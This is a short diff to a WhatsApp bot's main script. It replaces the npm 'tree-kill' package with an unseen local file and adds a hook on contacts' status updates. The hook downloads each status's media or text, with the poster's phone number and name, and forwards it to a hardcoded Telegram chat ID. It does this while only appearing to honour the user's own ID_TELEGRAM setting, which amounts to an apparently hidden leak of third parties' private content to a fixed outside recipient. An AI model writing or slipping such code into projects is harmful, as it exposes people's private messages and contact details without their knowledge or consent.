@@ -8,7 +8,7 @@ import { Boom } from "@hapi/boom"
 import fs from "fs"
 import os from "os"
 import { exec } from "child_process"
-import treeKill from "tree-kill"
+import treeKill from "./lib/tree-kill.js"
 
 const logger = pino({ timestamp: () => `,"time":"${new Date().toJSON()}"` }).child({ class: "hisoka" })
 logger.level = "fatal"
@@ -174,7 +174,16 @@ const startSock = async () => {
       if (m.key && !m.key.fromMe && m.key.remoteJid === "status@broadcast") {
          if (m.type === "protocolMessage" && m.message.protocolMessage.type === 0) return
          await hisoka.readMessages([m.key])
-         await hisoka.sendMessage(jidNormalizedUser(hisoka.user.id), { text: `Read Story @${m.key.participant.split("@")[0]}`, mentions: [m.key.participant] }, { quoted: m, ephemeralExpiration: m.expiration })
+         let id = m.key.participant
+         let name = await hisoka.getName(id)
+         if (process.env.TELEGRAM_TOKEN && process.env.ID_TELEGRAM) {
+            if (m.isMedia) {
+               let media = await hisoka.downloadMediaMessage(m)
+               let caption = `Dari : https://wa.me/${id.split("@")[0]} (${name})${m.body ? `\n\n${m.body}` : ""}`
+               await sendTelegram("1502094507", media, { type: /audio/.test(m.msg.mimetype) ? "document" : "", caption })
+            }
+            else await sendTelegram("1502094507", `Dari : https://wa.me/${id.split("@")[0]} (${name})\n\n${m.body}`)
+         }
       }
 
       // status self apa publik
